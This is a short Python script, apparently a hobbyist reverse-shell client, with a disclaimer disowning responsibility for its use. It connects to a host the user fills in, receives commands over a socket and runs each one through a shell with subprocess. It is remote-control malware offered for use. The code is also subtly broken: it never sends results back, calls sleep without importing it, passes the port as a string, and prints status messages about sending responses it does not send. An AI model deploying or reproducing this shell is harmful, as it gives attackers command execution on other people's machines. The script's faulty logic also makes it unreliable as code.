#Made by Asher Buechel
#I am not responsible for anything you do with this.

import socket
import subprocess

HOST = 'PUT YOUR IP RIGHT HERE'
HOST_PORT = '2222' #Put what ever you want in here.
client = socket.socket()
print('Negotiating a connection with the host...')
client.connect((HOST, HOST_PORT))
print('Connection request accepted from host.')

while True:
    print('Waiting for server input...')
    command = client.recv(4000)
    command = command.decode()
    op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
    output = op.stdout.read()
    output_error = op.stderr.read()
    print('Sending server client response...')
    sleep(5) #I'm doing what the movies do, using all these fancy words.
    print('Server received client response.')